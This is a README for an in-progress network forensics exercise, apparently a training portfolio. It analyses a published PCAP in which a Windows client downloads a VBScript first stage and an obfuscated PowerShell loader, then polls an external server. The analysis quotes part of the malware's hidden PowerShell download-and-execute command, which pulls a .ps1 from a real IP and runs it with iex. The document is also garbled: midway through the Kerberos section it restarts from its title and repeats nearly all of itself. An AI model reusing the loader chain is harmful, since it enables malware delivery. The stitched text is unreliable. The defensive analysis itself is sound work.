# Project 5 — Network PCAP Investigation

**Status:** In progress — initial local Wireshark triage performed 12 October 2026. Preliminary observations are documented below; HTTP responses, payload interpretation and final report are pending. Genuine user screenshots were reviewed in chat but have not yet been uploaded to this repository.

## Purpose

Conduct a reproducible, evidence-based Wireshark investigation of a published SOC training PCAP. Document what the packets actually support, distinguishing observed network facts, reasonable hypotheses and unverified assertions.

## Training case

**Case ID:** PCAP-0051 (portfolio case label)

**Source:** [Malware-Traffic-Analysis.net — 22 January 2025 traffic analysis exercise: Download from Fake Software Site](https://malware-traffic-analysis.net/2025/01/22/index.html)

**Scenario supplied by the exercise:** A simulated SOC receives a report about a suspected fake Google Authenticator download; an existing packet capture is provided for investigation. This is **third-party training evidence, not traffic captured by me or a live incident I handled**.

**Published lab context:** Internal subnet `10.1.17.0/24`; domain `bluemoontuesday.com`; published gateway `10.1.17.1` and domain controller `10.1.17.2`. These are **source-provided facts, not independently verified findings**.

**Acquisition:** The provider offers a password-protected ZIP containing a PCAP (~20.5 MB compressed). The user downloaded/extracted the training capture and opened `2025-01-22-traffic-analysis-exercise.pcap` in Wireshark on Kali. A local SHA-256 has now been captured from the user's Kali screenshot (see evidence metadata below). Extracted PCAP byte count and a separate acquisition log are still pending. Do not upload the raw PCAP or extracted malicious files to this repository.

## Local PCAP evidence fingerprint (12 October 2026)

- **Source:** published 22 January 2025 traffic analysis exercise at Malware-Traffic-Analysis.net.
- **Local filename:** `2025-01-22-traffic-analysis-exercise.pcap`
- **Local path (on user's Kali VM):** `/home/kali/Downloads/2025-01-22-traffic-analysis-exercise.pcap`
- **SHA-256 (as displayed by the user's local `sha256sum` output):** `e59db1c07c6fdefafa0abdbca03248c341cdc36c09c34753204d3162802a3586`
- **Capture size:** Not yet independently recorded (source page listed a 20,534,228-byte *compressed ZIP*, not necessarily the extracted PCAP size).
- **Verification scope:** Hash generated locally by user and visually checked from their terminal screenshot. It fingerprints those file bytes but is not a publisher-provided known-good checksum and does not validate that the PCAP is safe.
- **Evidence handling:** Original PCAP stays on local Kali VM; do not publish raw capture or extracted payloads. Local screenshot of hash has been viewed in chat but not yet added to GitHub.

## Preliminary locally observed packet evidence (12 October 2026)

The entries below come from the user's **actual Kali Wireshark screenshots**, reviewed during the lab, **not** from independently analysing the raw PCAP in this repository. Screenshots and PCAP are not yet committed. Frame numbers and relative times are shown as displayed.

- Wireshark status bar showed **39,427 packets** loaded.
- Statistics > Endpoints > IPv4 reported **145 IPv4 endpoints**; `10.1.17.215` appeared with 39,045 endpoint packet appearances and approximately 26 MB (endpoint totals can count packets at multiple endpoints).
- DNS screenshot showed `10.1.17.215` querying `10.1.17.2` for internal `bluemoontuesday.com` records and expected Microsoft connectivity/telemetry domains. These visible DNS queries alone are not malicious.
- Wireshark HTTP request display revealed traffic from `10.1.17.215` to external IP **`5.252.153.241`**:
  - **Frame 5031, relative time 60.297799 s:** `GET /api/file/get-file/264872 HTTP/1.1`
  - **Frame 5063, relative time 62.145732 s:** `GET /api/file/get-file/29842.ps1 HTTP/1.1`
  - **Frame 5073, relative time 62.366091 s:** `GET /1517096937 HTTP/1.1`
- `.ps1` in a requested URL path suggests a PowerShell script retrieval attempt; it is **not proof that the server delivered a valid script, that it ran or that the client was compromised**. The HTTP 200 response to the `.ps1` path is now **explicitly correlated** via Wireshark's `Request in frame: 5063` field, but actual script contents, whether the received bytes are valid PowerShell and subsequent execution remain unverified.
- The same screenshot showed several SSDP `M-SEARCH` multicast requests. HTTP-like syntax in SSDP should not be mistaken for ordinary web-browsing requests.

**Provisional assessment:** Suspicious outbound HTTP sequence worth further investigation in the published fake-software case; no definitive malicious verdict from requests alone.

### HTTP response evidence (user Wireshark screenshot, 12 October 2026)

A source-address display filter `http && ip.src == 5.252.153.241` showed HTTP traffic from the external server back to `10.1.17.215`:

| Frame | Relative time (s) | Status | Observation |
|---|---:|---|---|
| 5033 | 60.464642 | HTTP 200 OK | Selected packet visibly includes `Content-Type: application/octet-stream` and `Content-Length: 417` (declared size) |
| 5071 | 62.309349 | HTTP 200 OK | **Confirmed associated with request 5063**: Wireshark displays `Request in frame: 5063`, `Request URI: /api/file/get-file/29842.ps1`, `Content-Type: application/octet-stream`, `Content-Length: 1512`, `File Data: 1512 bytes`, response time 163.617 ms, reassembled from TCP frames 5070 and 5071 |
| 5075 | 62.564321 | HTTP 404 Not Found | First of several visible 404s |
| 7299, 7604, 7690, 7700, 7842, 7865, 7884, 7890, 7912, 7974 | ~67–119 | HTTP 404 Not Found | Repeated server not-found replies (do not assume beaconing solely from repeats) |
| 8000 | 124.958915 | HTTP 200 OK | Additional successful reply |

**Interpretation:** 200 status codes support that HTTP requests reached a responding server; a generic octet-stream body is consistent with transferred bytes but does not establish that the file was malicious or executed. The successful response to the `.ps1` URL is verified via the HTTP `Request in frame` field. **Receiving bytes is not proof of script execution, maliciousness or compromise.** The user has not uploaded these screenshots to GitHub yet.

### Static HTTP TCP-stream inspection — obfuscated PowerShell content

User's local Wireshark **Follow TCP Stream (stream 61)** screenshot shows:

- Request: `GET /api/file/get-file/29842.ps1 HTTP/1.1`; `Host: 5.252.153.241`.
- Response: `HTTP/1.1 200 OK`, `Content-Type: application/octet-stream`, `Content-Length: 1512`, with an HTTP body beginning with a PowerShell expression featuring `iex` (`Invoke-Expression`), `[system.text.encoding]::UTF8.GetString(...)`, `[system.convert]`, and repeated `.replace(...)` transformations.
- The obfuscated expression **appears intended to reconstruct/decode text and feed it into `iex`**. This suggests an obfuscated PowerShell loader, **not independently decoded**, and no payload execution has been tested or observed.
- In the same TCP stream, a later `GET /1517096937 HTTP/1.1` receives a `404 Not Found`. The HTTP response list showed several more `404` responses over time; determine whether these are attempts to reach a repeating endpoint before applying a beaconing/C2 label.
- The screenshots were shown directly by the user in chat. **Screenshot files have not yet been uploaded to GitHub**, and raw packet bytes have not been independently examined.

**Updated assessment:** High-priority suspicious network content consistent with an obfuscated downloaded PowerShell stage. The network capture supports delivery of bytes but **does not prove Windows executed the content, reached command-and-control, or was compromised**. No external indicators have been visited.

### Suspected periodic HTTP polling (Wireshark screenshot, 12 October 2026)

The user filtered `http.request.uri == "/1517096937"`. Wireshark shows **10 outbound GET requests** from `10.1.17.215` to `5.252.153.241:80`, with successive relative packet times:

| Request frame | Relative time (seconds) | Associated response (observed) |
|---|---:|---|
| 5073 | 62.366091 | 5075 — 404 |
| 7279 | 67.602135 | 7299 — 404 |
| 7602 | 72.778372 | 7604 — 404 |
| 7688 | 77.950821 | 7690 — 404 |
| 7696 | 83.150518 | 7700 — 404 |
| 7841 | 88.342574 | 7842 — 404 |
| 7864 | 93.533611 | 7865 — 404 |
| 7878 | 98.724353 | 7884 — 404 |
| 7888 | 103.914233 | 7890 — 404 |
| 7907 | 109.104654 | 7912 — 404 (visible in earlier HTTP server-response screenshot) |

Intervals between observed requests are approximately **5.17–5.24 seconds**, with mean **~5.19 seconds**. The traffic begins immediately after the HTTP delivery of the obfuscated PowerShell-like content from the **same external IP**. It is **consistent with automated HTTP polling / suspected beaconing**, but a `404 Not Found` is not evidence of delivered C2 instructions, and network packets alone do not prove script execution or host compromise. Timing pattern is reproducible from user-provided packet IDs and screenshot, not independently confirmed from the PCAP bytes.

### Additional external TLS session to 45.125.66.32 (12 October 2026)

The user's next Wireshark screenshot, using display filter `ip.addr == 45.125.66.32`, shows:

- **Frame 19302, relative time 889.561525 s:** `10.1.17.215:49792 -> 45.125.66.32:2917` TCP SYN.
- **Frames 19303–19304:** TCP SYN/ACK and ACK complete the three-way handshake.
- **Frame 19305, time 889.755043 s:** TLS 1.2 Client Hello; Info column appears to display an SNI value referencing `45.125.66.32`. Examine the detailed Client Hello to confirm.
- **Frame 19307, time 889.939650 s:** TLS 1.2 Server Hello, Certificate, Server Hello Done.
- **Frames 19310–19321:** TLS 1.2 key exchange / change cipher specification and bidirectional encrypted Application Data.

TLS on destination port **2917** is a noteworthy but non-diagnostic deviation from standard HTTPS port 443. An established TLS session with encrypted application data is observable; **what the encrypted traffic contains and whether it relates to earlier PowerShell/polling activity remain unknown**. No malicious verdict, certificate identity or compromise is claimed.

Additional screenshot of frame **19307** shows an expanded TLS 1.2 **Server Hello**, with negotiated cipher suite `TLS_RSA_WITH_AES_128_GCM_SHA256 (0x009c)`, zero-length Session ID, and JA3S string `771,156,65281-11`. These are handshake metadata, **not** evidence of maliciousness. The *certificate's subject, issuer and validity* are not visible in this screenshot and remain unverified.

**Next test:** Certificate details remain optional; prioritize recording the locally held PCAP's SHA-256, then continue investigating timeline and additional protocol relationships. Never execute captured scripts or contact suspicious IPs.

### Initial TLS Client Hello/SNI review — first 65 seconds (12 October 2026)

The user applied `tls.handshake.type == 1 && ip.src == 10.1.17.215 && frame.time_relative < 65` to the local training capture. The visible TLS Client Hello records include SNI values `azure.microsoft.com`, `www.microsoft.com`, `play.vidyard.com`, `publisher.liveperson.net`, `lpcdn.lpsnmedia.net`, `js.monitor.azure.com`, `assets.adobedtm.com`, and `browser.events.data.microsoft.com` (among others). **These are observed SNI values, not proof of deliberate browser visits or of any malicious destination.**

No SNI visible **in this screenshot/time slice** unambiguously identifies the fake-software website. This negative observation is limited to the shown packets and 65-second filter; the original landing page may be outside the capture, encrypted without visible SNI, or not identifiable here. Do not infer that the original download site is known from the exercise title.

**Next evidence step:** Investigate the earlier `GET /api/file/get-file/264872` (frame 5031) and matching `200 OK` response (frame 5033), read-only in Wireshark, to determine whether the first returned body provides useful context. Do not execute/export payloads.

### Earlier HTTP resource `264872` — confirmed response (12 October 2026)

User's Wireshark screenshot filtering `frame.number == 5031 || frame.number == 5033` provides a direct request-response link:

- **Frame 5031** (relative time **60.297799 s**): `10.1.17.215 -> 5.252.153.241`, `GET /api/file/get-file/264872`.
- **Frame 5033** (relative time **60.464642 s**): `5.252.153.241 -> 10.1.17.215`, `HTTP/1.1 200 OK`, `Request in frame: 5031`, `Content-Type: application/octet-stream`, `Content-Length: 417`, `File Data: 417 bytes`, and `Time since request: 166.843 ms`.
- This precedes the confirmed `.ps1` request (**5063**, at **62.145732 s**) and its response (**5071**, **62.309349 s**).
- **Important limitation:** The contents and format of the initial 417 bytes are still unknown; whether either download executed on the client is unverified. A `200 OK` does not itself confirm benignness or malware.

**Next practical step:** In Wireshark, right-click response frame 5033, choose Follow > TCP Stream and show ASCII to inspect the first response as inert text, without exporting, executing, or clicking any embedded links.

### First-stage script: 417-byte Windows Script Component-style VBScript (12 October 2026)

User's **read-only Wireshark Follow TCP Stream (stream 60)** screenshot shows the body of the earlier HTTP 200 response to `GET /api/file/get-file/264872` (request frame **5031**, response frame **5033**). The response declares `Content-Type: application/octet-stream` and `Content-Length: 417`, despite containing readable text with `<component>` and `<script language="VBScript">` markup.

Visible behaviours in that script:

- `On Error Resume Next` suppresses runtime error interruptions.
- `CreateObject("Wscript.Shell")` enables launching shell commands.
- `objShell.Run` launches a `cmd /c start /min powershell -NoProfile -WindowStyle Hidden -Command ...` chain, apparently intended to execute with minimal visible UI.
- The embedded PowerShell uses a `System.Net.WebClient` `DownloadString` call to retrieve `http://5.252.153.241:80/api/file/get-file/29842.ps1`, and `iex` to run the resulting text.
- The same line references `https://azure.microsoft.com` via `start-process` and includes `#URL: https://teams.microsoft.com`. These legitimate domains may act as decoy/camouflage; **their purpose and actual execution are not established**.

**Critical correlation:** The URL embedded in the first-stage script **matches** the subsequent observed HTTP request in frame **5063**, and the HTTP 200 in frame **5071** confirms delivery of 1,512 bytes of obfuscated PowerShell-like content. Subsequent same-server polling to `/1517096937` approximately every 5.2 seconds provides additional context.

**Assessment:** The first response contains script-launching and PowerShell download-and-execute *instructions*, materially strengthening the suspicion of a staged malware-loading sequence. The packet capture **does not by itself demonstrate that Windows actually executed either stage**, nor that the subsequent polling is definitely malware C2. A process-creation log or comparable endpoint evidence would be needed for execution claims.

**Evidence status:** The real screenshot was supplied by the user in chat but **is not yet uploaded into the GitHub repository**. Do not paste the full executable script into public documentation or execute it.

### Windows host identity confirmed from DHCP (12 October 2026)

The user's genuine Wireshark screenshot of **frame 3 (DHCP Request)** shows:

- **Option 12 Host Name:** `DESKTOP-L8C5GSJ`
- **Option 50 Requested IP Address:** `10.1.17.215`
- **Option 54 DHCP Server Identifier:** `10.1.17.2`
- **Client MAC:** `00:0d:b7:26:4a:74`
- **Option 81 Client Fully Qualified Domain Name:** present, but its value is not expanded in the screenshot.
- Related earlier client DNS traffic uses the `bluemoontuesday.com` internal domain.

This corroborates the client identification in suspicious HTTP/TLS packets. The hostname is **device identity, not a verified human username**. No local/end-user account name has yet been established from packet evidence, and a DHCP hostname alone does not establish that the endpoint executed the downloaded scripts. Screenshot visually inspected in chat; evidence image still needs to be uploaded to the repository.

### Authentication context: Kerberos/LDAP (12 October 2026)

The user's Wireshark screenshot filtered `ip.addr == 10.1.17.215 && (kerberos || ntlmssp)` shows traffic between client `10.1.17.215` and domain controller `10.1.17.2`. Visible relevant frames include:

- **Frame 250**, 14.368083 s — Kerberos AS-REQ
- **Frame 251**, 14.369177 s — Kerberos `KRB5KDC_ERR_PREAUTH_REQUIRED`; this can be a normal part of Kerberos pre-authentication negotiation, **not standalone evidence of a bad password**.
- **Frame 258**, 14.374722 s — Kerberos AS-REQ
- **Frame 260**, 14.376723 s — Kerberos AS-REP
- **Frames 269 and 272** — TGS-REQ / TGS-REP, indicating subsequent ticket activity.
- **Frame 30** — LDAP SASL bind request, and frame 32 a successful bind response (Info column). Some LDAP/DCE-RPC packets appear with this compound filter because protocol dissection can expose Kerberos/NTLMSSP fields.

**Account identity limitation:** No account principal is legible in the screenshot; the interactive human username is **not verified**. Inspect a Kerberos AS-REQ (e.g., frame 258) and locate client principal (`cname`/`name-string`) if available, noting that a machine principal ending `# Project 5 — Network PCAP Investigation

**Status:** In progress — initial local Wireshark triage performed 12 October 2026. Preliminary observations are documented below; HTTP responses, payload interpretation and final report are pending. Genuine user screenshots were reviewed in chat but have not yet been uploaded to this repository.

## Purpose

Conduct a reproducible, evidence-based Wireshark investigation of a published SOC training PCAP. Document what the packets actually support, distinguishing observed network facts, reasonable hypotheses and unverified assertions.

## Training case

**Case ID:** PCAP-0051 (portfolio case label)

**Source:** [Malware-Traffic-Analysis.net — 22 January 2025 traffic analysis exercise: Download from Fake Software Site](https://malware-traffic-analysis.net/2025/01/22/index.html)

**Scenario supplied by the exercise:** A simulated SOC receives a report about a suspected fake Google Authenticator download; an existing packet capture is provided for investigation. This is **third-party training evidence, not traffic captured by me or a live incident I handled**.

**Published lab context:** Internal subnet `10.1.17.0/24`; domain `bluemoontuesday.com`; published gateway `10.1.17.1` and domain controller `10.1.17.2`. These are **source-provided facts, not independently verified findings**.

**Acquisition:** The provider offers a password-protected ZIP containing a PCAP (~20.5 MB compressed). The user downloaded/extracted the training capture and opened `2025-01-22-traffic-analysis-exercise.pcap` in Wireshark on Kali. A local SHA-256 has now been captured from the user's Kali screenshot (see evidence metadata below). Extracted PCAP byte count and a separate acquisition log are still pending. Do not upload the raw PCAP or extracted malicious files to this repository.

## Local PCAP evidence fingerprint (12 October 2026)

- **Source:** published 22 January 2025 traffic analysis exercise at Malware-Traffic-Analysis.net.
- **Local filename:** `2025-01-22-traffic-analysis-exercise.pcap`
- **Local path (on user's Kali VM):** `/home/kali/Downloads/2025-01-22-traffic-analysis-exercise.pcap`
- **SHA-256 (as displayed by the user's local `sha256sum` output):** `e59db1c07c6fdefafa0abdbca03248c341cdc36c09c34753204d3162802a3586`
- **Capture size:** Not yet independently recorded (source page listed a 20,534,228-byte *compressed ZIP*, not necessarily the extracted PCAP size).
- **Verification scope:** Hash generated locally by user and visually checked from their terminal screenshot. It fingerprints those file bytes but is not a publisher-provided known-good checksum and does not validate that the PCAP is safe.
- **Evidence handling:** Original PCAP stays on local Kali VM; do not publish raw capture or extracted payloads. Local screenshot of hash has been viewed in chat but not yet added to GitHub.

## Preliminary locally observed packet evidence (12 October 2026)

The entries below come from the user's **actual Kali Wireshark screenshots**, reviewed during the lab, **not** from independently analysing the raw PCAP in this repository. Screenshots and PCAP are not yet committed. Frame numbers and relative times are shown as displayed.

- Wireshark status bar showed **39,427 packets** loaded.
- Statistics > Endpoints > IPv4 reported **145 IPv4 endpoints**; `10.1.17.215` appeared with 39,045 endpoint packet appearances and approximately 26 MB (endpoint totals can count packets at multiple endpoints).
- DNS screenshot showed `10.1.17.215` querying `10.1.17.2` for internal `bluemoontuesday.com` records and expected Microsoft connectivity/telemetry domains. These visible DNS queries alone are not malicious.
- Wireshark HTTP request display revealed traffic from `10.1.17.215` to external IP **`5.252.153.241`**:
  - **Frame 5031, relative time 60.297799 s:** `GET /api/file/get-file/264872 HTTP/1.1`
  - **Frame 5063, relative time 62.145732 s:** `GET /api/file/get-file/29842.ps1 HTTP/1.1`
  - **Frame 5073, relative time 62.366091 s:** `GET /1517096937 HTTP/1.1`
- `.ps1` in a requested URL path suggests a PowerShell script retrieval attempt; it is **not proof that the server delivered a valid script, that it ran or that the client was compromised**. The HTTP 200 response to the `.ps1` path is now **explicitly correlated** via Wireshark's `Request in frame: 5063` field, but actual script contents, whether the received bytes are valid PowerShell and subsequent execution remain unverified.
- The same screenshot showed several SSDP `M-SEARCH` multicast requests. HTTP-like syntax in SSDP should not be mistaken for ordinary web-browsing requests.

**Provisional assessment:** Suspicious outbound HTTP sequence worth further investigation in the published fake-software case; no definitive malicious verdict from requests alone.

### HTTP response evidence (user Wireshark screenshot, 12 October 2026)

A source-address display filter `http && ip.src == 5.252.153.241` showed HTTP traffic from the external server back to `10.1.17.215`:

| Frame | Relative time (s) | Status | Observation |
|---|---:|---|---|
| 5033 | 60.464642 | HTTP 200 OK | Selected packet visibly includes `Content-Type: application/octet-stream` and `Content-Length: 417` (declared size) |
| 5071 | 62.309349 | HTTP 200 OK | **Confirmed associated with request 5063**: Wireshark displays `Request in frame: 5063`, `Request URI: /api/file/get-file/29842.ps1`, `Content-Type: application/octet-stream`, `Content-Length: 1512`, `File Data: 1512 bytes`, response time 163.617 ms, reassembled from TCP frames 5070 and 5071 |
| 5075 | 62.564321 | HTTP 404 Not Found | First of several visible 404s |
| 7299, 7604, 7690, 7700, 7842, 7865, 7884, 7890, 7912, 7974 | ~67–119 | HTTP 404 Not Found | Repeated server not-found replies (do not assume beaconing solely from repeats) |
| 8000 | 124.958915 | HTTP 200 OK | Additional successful reply |

**Interpretation:** 200 status codes support that HTTP requests reached a responding server; a generic octet-stream body is consistent with transferred bytes but does not establish that the file was malicious or executed. The successful response to the `.ps1` URL is verified via the HTTP `Request in frame` field. **Receiving bytes is not proof of script execution, maliciousness or compromise.** The user has not uploaded these screenshots to GitHub yet.

### Static HTTP TCP-stream inspection — obfuscated PowerShell content

User's local Wireshark **Follow TCP Stream (stream 61)** screenshot shows:

- Request: `GET /api/file/get-file/29842.ps1 HTTP/1.1`; `Host: 5.252.153.241`.
- Response: `HTTP/1.1 200 OK`, `Content-Type: application/octet-stream`, `Content-Length: 1512`, with an HTTP body beginning with a PowerShell expression featuring `iex` (`Invoke-Expression`), `[system.text.encoding]::UTF8.GetString(...)`, `[system.convert]`, and repeated `.replace(...)` transformations.
- The obfuscated expression **appears intended to reconstruct/decode text and feed it into `iex`**. This suggests an obfuscated PowerShell loader, **not independently decoded**, and no payload execution has been tested or observed.
- In the same TCP stream, a later `GET /1517096937 HTTP/1.1` receives a `404 Not Found`. The HTTP response list showed several more `404` responses over time; determine whether these are attempts to reach a repeating endpoint before applying a beaconing/C2 label.
- The screenshots were shown directly by the user in chat. **Screenshot files have not yet been uploaded to GitHub**, and raw packet bytes have not been independently examined.

**Updated assessment:** High-priority suspicious network content consistent with an obfuscated downloaded PowerShell stage. The network capture supports delivery of bytes but **does not prove Windows executed the content, reached command-and-control, or was compromised**. No external indicators have been visited.

### Suspected periodic HTTP polling (Wireshark screenshot, 12 October 2026)

The user filtered `http.request.uri == "/1517096937"`. Wireshark shows **10 outbound GET requests** from `10.1.17.215` to `5.252.153.241:80`, with successive relative packet times:

| Request frame | Relative time (seconds) | Associated response (observed) |
|---|---:|---|
| 5073 | 62.366091 | 5075 — 404 |
| 7279 | 67.602135 | 7299 — 404 |
| 7602 | 72.778372 | 7604 — 404 |
| 7688 | 77.950821 | 7690 — 404 |
| 7696 | 83.150518 | 7700 — 404 |
| 7841 | 88.342574 | 7842 — 404 |
| 7864 | 93.533611 | 7865 — 404 |
| 7878 | 98.724353 | 7884 — 404 |
| 7888 | 103.914233 | 7890 — 404 |
| 7907 | 109.104654 | 7912 — 404 (visible in earlier HTTP server-response screenshot) |

Intervals between observed requests are approximately **5.17–5.24 seconds**, with mean **~5.19 seconds**. The traffic begins immediately after the HTTP delivery of the obfuscated PowerShell-like content from the **same external IP**. It is **consistent with automated HTTP polling / suspected beaconing**, but a `404 Not Found` is not evidence of delivered C2 instructions, and network packets alone do not prove script execution or host compromise. Timing pattern is reproducible from user-provided packet IDs and screenshot, not independently confirmed from the PCAP bytes.

### Additional external TLS session to 45.125.66.32 (12 October 2026)

The user's next Wireshark screenshot, using display filter `ip.addr == 45.125.66.32`, shows:

- **Frame 19302, relative time 889.561525 s:** `10.1.17.215:49792 -> 45.125.66.32:2917` TCP SYN.
- **Frames 19303–19304:** TCP SYN/ACK and ACK complete the three-way handshake.
- **Frame 19305, time 889.755043 s:** TLS 1.2 Client Hello; Info column appears to display an SNI value referencing `45.125.66.32`. Examine the detailed Client Hello to confirm.
- **Frame 19307, time 889.939650 s:** TLS 1.2 Server Hello, Certificate, Server Hello Done.
- **Frames 19310–19321:** TLS 1.2 key exchange / change cipher specification and bidirectional encrypted Application Data.

TLS on destination port **2917** is a noteworthy but non-diagnostic deviation from standard HTTPS port 443. An established TLS session with encrypted application data is observable; **what the encrypted traffic contains and whether it relates to earlier PowerShell/polling activity remain unknown**. No malicious verdict, certificate identity or compromise is claimed.

Additional screenshot of frame **19307** shows an expanded TLS 1.2 **Server Hello**, with negotiated cipher suite `TLS_RSA_WITH_AES_128_GCM_SHA256 (0x009c)`, zero-length Session ID, and JA3S string `771,156,65281-11`. These are handshake metadata, **not** evidence of maliciousness. The *certificate's subject, issuer and validity* are not visible in this screenshot and remain unverified.

**Next test:** Certificate details remain optional; prioritize recording the locally held PCAP's SHA-256, then continue investigating timeline and additional protocol relationships. Never execute captured scripts or contact suspicious IPs.

### Initial TLS Client Hello/SNI review — first 65 seconds (12 October 2026)

The user applied `tls.handshake.type == 1 && ip.src == 10.1.17.215 && frame.time_relative < 65` to the local training capture. The visible TLS Client Hello records include SNI values `azure.microsoft.com`, `www.microsoft.com`, `play.vidyard.com`, `publisher.liveperson.net`, `lpcdn.lpsnmedia.net`, `js.monitor.azure.com`, `assets.adobedtm.com`, and `browser.events.data.microsoft.com` (among others). **These are observed SNI values, not proof of deliberate browser visits or of any malicious destination.**

No SNI visible **in this screenshot/time slice** unambiguously identifies the fake-software website. This negative observation is limited to the shown packets and 65-second filter; the original landing page may be outside the capture, encrypted without visible SNI, or not identifiable here. Do not infer that the original download site is known from the exercise title.

**Next evidence step:** Investigate the earlier `GET /api/file/get-file/264872` (frame 5031) and matching `200 OK` response (frame 5033), read-only in Wireshark, to determine whether the first returned body provides useful context. Do not execute/export payloads.

### Earlier HTTP resource `264872` — confirmed response (12 October 2026)

User's Wireshark screenshot filtering `frame.number == 5031 || frame.number == 5033` provides a direct request-response link:

- **Frame 5031** (relative time **60.297799 s**): `10.1.17.215 -> 5.252.153.241`, `GET /api/file/get-file/264872`.
- **Frame 5033** (relative time **60.464642 s**): `5.252.153.241 -> 10.1.17.215`, `HTTP/1.1 200 OK`, `Request in frame: 5031`, `Content-Type: application/octet-stream`, `Content-Length: 417`, `File Data: 417 bytes`, and `Time since request: 166.843 ms`.
- This precedes the confirmed `.ps1` request (**5063**, at **62.145732 s**) and its response (**5071**, **62.309349 s**).
- **Important limitation:** The contents and format of the initial 417 bytes are still unknown; whether either download executed on the client is unverified. A `200 OK` does not itself confirm benignness or malware.

**Next practical step:** In Wireshark, right-click response frame 5033, choose Follow > TCP Stream and show ASCII to inspect the first response as inert text, without exporting, executing, or clicking any embedded links.

### First-stage script: 417-byte Windows Script Component-style VBScript (12 October 2026)

User's **read-only Wireshark Follow TCP Stream (stream 60)** screenshot shows the body of the earlier HTTP 200 response to `GET /api/file/get-file/264872` (request frame **5031**, response frame **5033**). The response declares `Content-Type: application/octet-stream` and `Content-Length: 417`, despite containing readable text with `<component>` and `<script language="VBScript">` markup.

Visible behaviours in that script:

- `On Error Resume Next` suppresses runtime error interruptions.
- `CreateObject("Wscript.Shell")` enables launching shell commands.
- `objShell.Run` launches a `cmd /c start /min powershell -NoProfile -WindowStyle Hidden -Command ...` chain, apparently intended to execute with minimal visible UI.
- The embedded PowerShell uses a `System.Net.WebClient` `DownloadString` call to retrieve `http://5.252.153.241:80/api/file/get-file/29842.ps1`, and `iex` to run the resulting text.
- The same line references `https://azure.microsoft.com` via `start-process` and includes `#URL: https://teams.microsoft.com`. These legitimate domains may act as decoy/camouflage; **their purpose and actual execution are not established**.

**Critical correlation:** The URL embedded in the first-stage script **matches** the subsequent observed HTTP request in frame **5063**, and the HTTP 200 in frame **5071** confirms delivery of 1,512 bytes of obfuscated PowerShell-like content. Subsequent same-server polling to `/1517096937` approximately every 5.2 seconds provides additional context.

**Assessment:** The first response contains script-launching and PowerShell download-and-execute *instructions*, materially strengthening the suspicion of a staged malware-loading sequence. The packet capture **does not by itself demonstrate that Windows actually executed either stage**, nor that the subsequent polling is definitely malware C2. A process-creation log or comparable endpoint evidence would be needed for execution claims.

**Evidence status:** The real screenshot was supplied by the user in chat but **is not yet uploaded into the GitHub repository**. Do not paste the full executable script into public documentation or execute it.

### Windows host identity confirmed from DHCP (12 October 2026)

The user's genuine Wireshark screenshot of **frame 3 (DHCP Request)** shows:

- **Option 12 Host Name:** `DESKTOP-L8C5GSJ`
- **Option 50 Requested IP Address:** `10.1.17.215`
- **Option 54 DHCP Server Identifier:** `10.1.17.2`
- **Client MAC:** `00:0d:b7:26:4a:74`
- **Option 81 Client Fully Qualified Domain Name:** present, but its value is not expanded in the screenshot.
- Related earlier client DNS traffic uses the `bluemoontuesday.com` internal domain.

This corroborates the client identification in suspicious HTTP/TLS packets. The hostname is **device identity, not a verified human username**. No local/end-user account name has yet been established from packet evidence, and a DHCP hostname alone does not establish that the endpoint executed the downloaded scripts. Screenshot visually inspected in chat; evidence image still needs to be uploaded to the repository.

 does not identify a human user. Do not publish personally identifiable usernames unless required and privacy-reviewed.

## Immediate next investigation

**Now confirmed:** The `.ps1` HTTP response and subsequent ~5.2-second HTTP polling were observed; a later TLS 1.2 session to `45.125.66.32:2917` was observed but is not yet attributed. The local PCAP SHA-256 has been recorded. The initial TLS SNI slice did not visibly establish the landing-page hostname. **Next:** The 417-byte first-stage VBScript and `.ps1` delivery are correlated; DHCP confirms the device hostname and MAC; Kerberos/LDAP traffic is present, but no user principal has yet been verified. Inspect frame 258 for the Kerberos `cname` if exposed, then finish the bounded timeline and curate authentic evidence screenshots. Never execute captured scripts or visit suspect URLs. Do not visit captured URLs.

## Investigation questions

1. Which Windows client is associated with the suspicious activity? Record IP, MAC, hostname and user, with packet or protocol evidence where visible.
2. Which domain appears associated with the purported fake software download?
3. What outbound IPs or hostnames appear consistent with suspected command-and-control activity? Distinguish observations from attribution.
4. What is the supported network timeline (DNS, HTTP, TLS, TCP where visible), and which limitations prevent stronger conclusions?
5. What detection, containment and monitoring recommendations follow from the evidence?

## Planned investigation workflow

1. Acquire the training capture safely, record the precise source URL, date, size and SHA-256, and preserve the original unmodified.
2. Open the file **offline** in Wireshark; do not visit destinations, replay traffic, execute downloads or extracted payloads.
3. Capture initial statistics: packet total, endpoints, conversations, top protocols and capture time range.
4. Explore suspicious sessions using display filters, DNS queries, HTTP hosts/URIs (if present), TLS SNI (if present) and TCP streams. Explain each filter's purpose.
5. Build a cited packet/time evidence table, test benign alternatives and produce a bounded SOC investigation report.
6. Upload genuine screenshots from the user's local analysis and create an evidence index. Redact private data where necessary; preserve informative context.
7. Add lessons learned, interview guide, memorisation notes and **20 additional master flashcards (81–100)** in the **separate** study repository after genuine practical work.

## Evidence and reporting rules

- Cite the packet/frame number, timestamp, source, destination, protocol and reason for each significant finding.
- Record whether a datum came from the exercise narrative or was independently observed in packets.
- No invented screenshots, invented hashes, fabricated incidents or assumed victim impact.
- Inferences about compromise or C2 need corroborating packet evidence. TLS encryption and incomplete capture may limit conclusions.
- Local copies of the PCAP and any payload bytes stay outside this public GitHub repository.
- Keep this status **In progress** until the actual hands-on capture analysis, evidence and reporting are finished.

## Next action

Inspect HTTP traffic to `5.252.153.241` for the corresponding server responses and headers, preserve a real screenshot, and record a SHA-256 for the locally held capture. Do not execute or browse to payload URLs.

---
This portfolio documents a published training exercise, not an investigation into a user's real workplace or network.